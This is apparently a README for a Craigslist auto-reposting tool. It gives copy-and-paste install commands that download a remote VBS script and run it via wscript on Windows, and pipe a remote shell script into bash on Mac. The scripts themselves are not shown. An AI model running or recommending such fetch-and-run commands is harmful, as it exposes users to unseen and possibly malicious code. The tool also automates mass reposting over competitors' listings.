# Craigslist Auto Poster
## Windows PowerShell Install/Update Instructions
Copy and paste the following command into your Windows PowerShell app and then press enter to install/update:
```sh
Invoke-WebRequest -Uri "https://cl-auto-poster.github.io/craigslist-auto-poster/CL_RePoster_Windows_Installer.vbs" -OutFile "$env:TEMP\CL_RePoster_Windows_Installer.vbs"; wscript "$env:TEMP\CL_RePoster_Windows_Installer.vbs"
```
## Mac Terminal Install/Update Instructions
Copy and paste the following command into your Mac Terminal app and then press enter to install/update:
```sh
curl -fsSL https://cl-auto-poster.github.io/craigslist-auto-poster/CL_RePoster_Mac_Installer.sh | bash || { (command -v brew >/dev/null 2>&1 || /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)") && brew install curl && $(command -v /usr/local/opt/curl/bin/curl || command -v /opt/homebrew/opt/curl/bin/curl) -fsSL https://cl-auto-poster.github.io/craigslist-auto-poster/CL_RePoster_Mac_Installer.sh | bash; }
```
### Features
- Auto post Craigslist gigs and services on auto-pilot.
- Idle mode reposts when your post category hasn't been posted in over 15 minutes.
- Compete mode relists when your competitors post their listing over yours based on the keywords in your title.
- Interval mode reposts minutes, hours, days, month, etc...
- Single-click repostings.
- Quick jump URL address bar.
- Persistant login sessions.
- Run in background system tray.
- Compatible with Windows and Mac.

![Screenshot](https://github.com/craigslist-automated/Craigslist-auto-poster-free/raw/main/images/craigslistrelister.png?raw=true)
#### Privacy
We prioritize delivering quality software without raising costs or liabilities, so we do not collect user information.